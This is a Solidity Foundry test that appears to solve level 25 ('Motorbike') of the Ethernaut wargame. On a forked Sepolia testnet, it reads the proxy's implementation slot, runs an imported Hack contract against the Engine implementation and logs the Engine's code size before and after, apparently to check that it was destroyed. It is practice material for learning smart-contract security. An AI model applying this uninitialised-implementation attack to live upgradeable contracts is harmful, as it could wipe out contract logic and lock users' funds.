//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Hack, IMotorbike, IEngine} from "../src/level25.sol";

contract level25Test is Test {
    IMotorbike target;
    bytes32 constant SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        vm.createSelectFork("SEPOLIA", 4000000);
        address instanceAddress = vm.envAddress("INSTANCE_AD");
        target = IMotorbike(instanceAddress);
    }

    function testSolvesLeve25() public {
        address hacker = makeAddr("hacker");
        address implementation = address(
            uint160(uint256(vm.load(address(target), SLOT)))
        );

        uint256 codeSizeBefore;
        assembly {
            codeSizeBefore := extcodesize(implementation)
        }
        assertTrue(codeSizeBefore > 0, "Engine should exist");

        vm.startPrank(hacker, hacker);
        Hack hackContract = new Hack(address(target));
        hackContract.hack(implementation);
        vm.stopPrank();

        uint256 codeSizeAfter;
        assembly {
            codeSizeAfter := extcodesize(implementation)
        }

        console.log("Code size before:", codeSizeBefore);
        console.log("Code size after:", codeSizeAfter);
    }
}
//INSTANCE_AD=0x2493C22524262C7E7c16b10722e802d75d160e9b forge test --mt testSolvesLeve25 -vvv
